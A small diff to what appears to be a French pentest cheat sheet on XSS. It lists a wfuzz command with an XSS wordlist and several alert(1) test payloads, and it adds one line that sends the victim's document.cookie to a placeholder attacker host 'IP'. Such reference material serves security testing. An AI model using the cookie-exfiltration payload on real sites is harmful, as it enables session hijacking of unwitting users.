@@ -63,6 +63,7 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.t
 <body onload=alert(1)>
 <svg onload=alert(1)>
 <iframe src="javascript:alert(1)">
+<img src=x onerror="document.location='http://IP/?c='+document.cookie">
 ```
 
 ### 3.2 Attribut HTML (entre guillemets)
